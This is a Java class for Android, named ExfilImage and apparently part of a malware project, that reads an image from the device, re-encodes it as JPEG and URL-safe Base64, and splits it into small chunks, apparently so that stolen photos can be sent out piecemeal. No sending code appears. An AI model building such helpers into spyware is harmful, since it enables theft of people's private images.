package com.mlw.extorch;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.util.Base64;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class ExfilImage {
    private String image_path = "";
    private int quality = 60;

    ExfilImage(String image_path, int quality){
        this.image_path = image_path;
        this.quality = quality;
    }

    private String image_to_b64() {
        Bitmap bm = BitmapFactory.decodeFile(this.image_path);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG, this.quality, baos); // bm is the bitmap object
        byte[] bytes = baos.toByteArray();
        String converted = Base64.encodeToString(bytes, Base64.DEFAULT);
        return converted;
    }

    public List<String> buffered_b64image(int chunksize){
        String b64image = this.image_to_b64();
        b64image = Utils.b64_url_encoding(b64image);
        List<String> image_buffers = new ArrayList<>();
        int length = b64image.length();
        for (int i = 0; i < length; i += chunksize) {
            image_buffers.add(b64image.substring(i, Math.min(length, i + chunksize)));
        }
        return image_buffers;
    }

}
